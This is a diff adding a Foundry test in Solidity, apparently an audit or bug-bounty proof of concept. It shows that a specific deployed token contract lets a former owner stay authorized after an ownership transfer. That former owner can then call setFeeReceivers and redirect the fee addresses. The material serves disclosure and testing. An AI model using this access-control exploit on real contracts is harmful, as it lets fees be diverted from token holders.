@@ -1,0 +1,52 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.10;
+
+import "forge-std/Test.sol";
+
+interface IFooDFi {
+    function isOwner(address account) external view returns (bool);
+    function isAuthorized(address adr) external view returns (bool);
+    function transferOwnership(address payable adr) external;
+    function setFeeReceivers(
+        address _autoLiquidityReceiver,
+        address _marketingFeeReceiver,
+        address _devFeeReceiver
+    ) external;
+}
+
+contract ExploitTest is Test {
+    IFooDFi public constant target = IFooDFi(0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf);
+    address originalOwner;
+
+    function setUp() public {
+        // Read owner from storage slot 0 (Auth contract stores owner first)
+        bytes32 ownerSlot = vm.load(address(target), bytes32(uint256(0)));
+        originalOwner = address(uint160(uint256(ownerSlot)));
+        vm.label(originalOwner, "OriginalOwner");
+    }
+
+    function testPreviousOwnerRemainsAuthorized() public {
+        // New owner address
+        address payable newOwner = payable(address(0xdead));
+        vm.label(newOwner, "NewOwner");
+
+        // Transfer ownership from originalOwner to newOwner
+        vm.prank(originalOwner);
+        target.transferOwnership(newOwner);
+
+        // Verify ownership changed
+        assertFalse(target.isOwner(originalOwner), "Original owner should no longer be owner");
+        assertTrue(target.isOwner(newOwner), "New owner should be owner");
+
+        // Verify original owner still authorized
+        assertTrue(target.isAuthorized(originalOwner), "Original owner should remain authorized");
+
+        // Original owner can successfully call an authorized-only function
+        vm.prank(originalOwner);
+        target.setFeeReceivers(newOwner, newOwner, newOwner);
+
+        // If no revert, the test passes – previous owner retains authorized access.
+    }
+}
+```
